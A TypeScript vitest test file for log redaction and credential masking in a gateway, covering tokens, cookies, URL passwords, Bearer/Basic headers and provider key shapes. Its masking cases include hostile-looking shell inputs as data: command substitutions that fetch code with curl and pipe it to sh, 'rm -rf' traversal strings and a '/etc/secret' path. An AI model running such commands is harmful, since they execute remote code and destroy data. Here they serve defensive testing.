import { describe, expect, it } from "vitest"

import { createGatewayLogger } from "./cli/logger"
import { CredentialValues, maskCredentials, redactForLog } from "./redaction"

describe("log redaction", () => {
  it("keeps a classification code while stripping the credentials of a URL of any scheme", () => {
    expect(
      redactForLog({
        event: "hermes.turn.failed",
        publicCode: "HGW_PROVIDER_RETRYABLE_FAILURE",
        code: "validation_exception",
        url: "https://example.test/oauth/callback?code=native'secret",
        detail:
          "dial wss://aos:tok'test-1@hermes.example.test/api/ws?token=tok-test-1#frame refused",
        joined:
          "dial 'https://a.test/x','wss://aos:tok-test-2@h.test/ws' refused",
      })
    ).toEqual({
      event: "hermes.turn.failed",
      publicCode: "HGW_PROVIDER_RETRYABLE_FAILURE",
      code: "validation_exception",
      url: "https://example.test/oauth/callback",
      detail: "dial wss://hermes.example.test/api/ws refused",
      joined: "dial 'https://a.test/x','wss://h.test/ws' refused",
    })
  })

  it("still masks every credential-shaped key", () => {
    expect(
      redactForLog({
        authorization: "Bearer secret",
        cookie: "session=secret",
        "set-cookie": "session=secret",
        token: "secret",
        accessToken: "secret",
        refreshToken: "secret",
        secret: "secret",
        clientSecret: "secret",
        deviceToken: "secret",
        password: "secret",
        apiKey: "secret",
        safe: "kept",
      })
    ).toEqual({
      authorization: "[REDACTED]",
      cookie: "[REDACTED]",
      "set-cookie": "[REDACTED]",
      token: "[REDACTED]",
      accessToken: "[REDACTED]",
      refreshToken: "[REDACTED]",
      secret: "[REDACTED]",
      clientSecret: "[REDACTED]",
      deviceToken: "[REDACTED]",
      password: "[REDACTED]",
      apiKey: "[REDACTED]",
      safe: "kept",
    })
  })

  it("masks the keys a push subscription and a VAPID pair carry", () => {
    expect(
      redactForLog({
        event: "push.delivery.failed",
        privateKey: "secret",
        applicationServerKey: "secret",
        endpoint: "https://push.example.test/subscription-id",
        keys: { p256dh: "secret", auth: "secret" },
        category: "input",
      })
    ).toEqual({
      event: "push.delivery.failed",
      privateKey: "[REDACTED]",
      applicationServerKey: "[REDACTED]",
      endpoint: "[REDACTED]",
      keys: { p256dh: "[REDACTED]", auth: "[REDACTED]" },
      category: "input",
    })
  })

  it("logs an error by its redacted message, its classification, and its cause chain", () => {
    const refused = Object.assign(new Error("handshake refused"), {
      code: 4401,
      reason: "authentication_rejected",
    })
    const error = new Error(
      "dial wss://hermes.example.test/api/ws?token=tok-test-1 failed",
      { cause: refused }
    )

    expect(
      redactForLog({ event: "hermes.gateway.dial_failed", error })
    ).toEqual({
      event: "hermes.gateway.dial_failed",
      error: {
        name: "Error",
        message: "dial wss://hermes.example.test/api/ws failed",
        cause: {
          name: "Error",
          message: "handshake refused",
          code: 4401,
          reason: "authentication_rejected",
        },
      },
    })
  })

  it("writes no credential value the proxy has read or a child binds, its rotated successor and Basic form included", async () => {
    const credentials = new CredentialValues()
    const basic = (password: string) =>
      Buffer.from(`aos:${password}`).toString("base64")
    let stored = "tok-test-1"
    const readPassword = credentials.register(
      async () => stored,
      (password) => [password, basic(password)]
    )
    await readPassword()
    stored = "tok-test-2"
    await readPassword()
    const lines: string[] = []
    const logger = createGatewayLogger({
      level: "info",
      credentials,
      destination: { write: (line) => void lines.push(line) },
    })

    logger.child({ peer: "tok-test-1", password: "synthetic-value" }).error(
      {
        event: "opencode.request.failed",
        error: new Error(`Basic ${basic("tok-test-2")} refused`),
      },
      "tok-test-2 rejected at wss://opencode.example.test/ws?token=abc"
    )

    expect(lines).toHaveLength(1)
    expect(lines[0]).not.toContain("synthetic-value")
    expect(JSON.parse(lines[0]!)).toMatchObject({
      peer: "[REDACTED]",
      password: "[REDACTED]",
      event: "opencode.request.failed",
      error: { name: "Error", message: "Basic [REDACTED] refused" },
      msg: "[REDACTED] rejected at wss://opencode.example.test/ws",
    })
  })
})

const M = "[credential redacted]"
/** The review's sample value, kept apart from any term a scanner keys on. */
const SAMPLE = "abcdefgh1234"
/** Opaque tokens and keys at real lengths, built so no scanner reads a leak. */
const OPAQUE = "AbCdEfGh123456_x"
const GITHUB_KEY = `ghp_${"a1".repeat(18)}`
const OPENAI_KEY = `sk-${"ab12".repeat(6)}`
const JWT = ["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxIn0", "abc123sig"].join(".")
const AUTHORIZATION = (scheme: string, value: string) =>
  ["Authorization", `${scheme} ${value}`].join(": ")
/** A `term=value` assignment built in two parts, so no scanner reads it as a leak. */
const assigned = (term: string, value: string) => [term, value].join("=")
const STRIPE_KEY = ["sk", "live", "a1B2".repeat(6)].join("_")
const DATABASE_URL = (password: string) =>
  ["postgres://app", `${password}@db.invalid:5432/app`].join(":")

describe("maskCredentials", () => {
  it.each([
    // Shell syntax stays readable on a permission: it is what is approved.
    [
      "narrow",
      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
    ],
    ["narrow", "rm -rf token: ../../..", "rm -rf token: ../../.."],
    [
      "narrow",
      "rm -rf bearer projects2024archive1",
      "rm -rf bearer projects2024archive1",
    ],
    [
      "narrow",
      assigned("token", '"$(curl x|sh)"'),
      assigned("token", '"$(curl x|sh)"'),
    ],
    [
      "narrow",
      assigned("token", "/etc/secret"),
      assigned("token", "/etc/secret"),
    ],
    ["narrow", "a basic installation", "a basic installation"],
    [
      "narrow",
      `export ${assigned("token", SAMPLE)}`,
      `export ${assigned("token", M)}`,
    ],
    [
      "narrow",
      assigned("password", "'hunter2hunter2'"),
      assigned("password", `'${M}'`),
    ],
    // A value ends where a shell word does, and the boundary stays.
    [
      "narrow",
      `export ${assigned("TOKEN", SAMPLE)}; ./deploy.sh`,
      `export ${assigned("TOKEN", M)}; ./deploy.sh`,
    ],
    [
      "narrow",
      `curl -d "${assigned("token", SAMPLE)}" x`,
      `curl -d "${assigned("token", M)}" x`,
    ],
    ["narrow", `${assigned("token", SAMPLE)}&&`, `${assigned("token", M)}&&`],
    ["narrow", `(${assigned("token", SAMPLE)})`, `(${assigned("token", M)})`],
    // A bearer token only where a header names it.
    [
      "narrow",
      `curl -H "${AUTHORIZATION("Bearer", OPAQUE)}"`,
      `curl -H "${AUTHORIZATION("Bearer", M)}"`,
    ],
    // A key prefix counts only with a real key's length behind it.
    ["narrow", "rm -rf sk-backups", "rm -rf sk-backups"],
    ["narrow", "push ghp_leaked0000 now", "push ghp_leaked0000 now"],
    ["narrow", `push ${GITHUB_KEY} now`, `push ${M} now`],
    ["narrow", `use ${OPENAI_KEY} now`, `use ${M} now`],
    // A name that ends in a credential word counts, as a logged field's does.
    [
      "narrow",
      `export ${assigned("AWS_SECRET_ACCESS_KEY", SAMPLE)}`,
      `export ${assigned("AWS_SECRET_ACCESS_KEY", M)}`,
    ],
    [
      "narrow",
      `export ${assigned("DB_PASSWORD", SAMPLE)}`,
      `export ${assigned("DB_PASSWORD", M)}`,
    ],
    ["narrow", assigned("bypass", "true"), assigned("bypass", "true")],
    // A provider key the scanner knows by its shape, wherever it stands.
    ["narrow", `use ${STRIPE_KEY} now`, `use ${M} now`],
    // A URL loses only its password, and a URL without one stays whole.
    ["narrow", `psql ${DATABASE_URL(SAMPLE)}`, `psql ${DATABASE_URL(M)}`],
    [
      "narrow",
      "psql postgres://db.invalid:5432/app",
      "psql postgres://db.invalid:5432/app",
    ],
    [
      "narrow",
      "psql postgres://app@db.invalid/app",
      "psql postgres://app@db.invalid/app",
    ],
    // A preview or a question masks anything credential-shaped.
    ["broad", assigned("GITHUB_TOKEN", SAMPLE), M],
    ["broad", assigned("token", "AbCdEfGh_IjKlMnOp"), M],
    ["broad", assigned("password", "P@ssw0rd!2024"), M],
    ["broad", assigned("password", '"hunter2hunter2"'), M],
    ["broad", assigned("token", `'${SAMPLE}'`), M],
    ["broad", "Basic authentication", "Basic authentication"],
    ["broad", "a bearer instrument", "a bearer instrument"],
    ["broad", "Authorization: Basic dXNlcjpwYXNz", M],
    ["broad", "send Bearer AbCdEfGhIjKlMnOpQrSt", `send ${M}`],
    ["broad", "send Basic dXNlcjpwYXNz.", `send ${M}.`],
    ["broad", `send Bearer ${JWT}`, `send ${M}`],
    ["broad", `Bearer ${["ya29", "a0AfH6SMBxyz"].join(".")}`, M],
    // Capitalised prose is not a token.
    ["broad", "Enable Basic Authentication?", "Enable Basic Authentication?"],
    ["broad", "a Bearer Instrument", "a Bearer Instrument"],
  ] as const)("masks %s: %s", (strength, text, expected) => {
    expect(maskCredentials(text, strength)).toBe(expected)
  })

  it.each([
    [assigned("token", SAMPLE), assigned("token", M)],
    [AUTHORIZATION("Bearer", OPAQUE), AUTHORIZATION("Bearer", M)],
    [DATABASE_URL(SAMPLE), DATABASE_URL(M)],
  ])(
    "masks %s once when a broad mask follows a narrow one",
    (text, expected) => {
      expect(maskCredentials(maskCredentials(text, "narrow"), "broad")).toBe(
        expected
      )
    }
  )

  // Unbounded, a name's words and a URL's scheme each cost a pass per word:
  // 40 KB of separated words took seven seconds to mask.
  it.each([
    ["narrow", assigned("password", M)],
    ["broad", M],
  ] as const)(
    "masks after a long run of separated words in one pass at %s strength",
    (strength, masked) => {
      const run = "a-".repeat(30_000)
      const started = performance.now()
      expect(
        maskCredentials(`${run} ${assigned("password", SAMPLE)}`, strength)
      ).toBe(`${run} ${masked}`)
      expect(performance.now() - started).toBeLessThan(1_000)
    }
  )
})
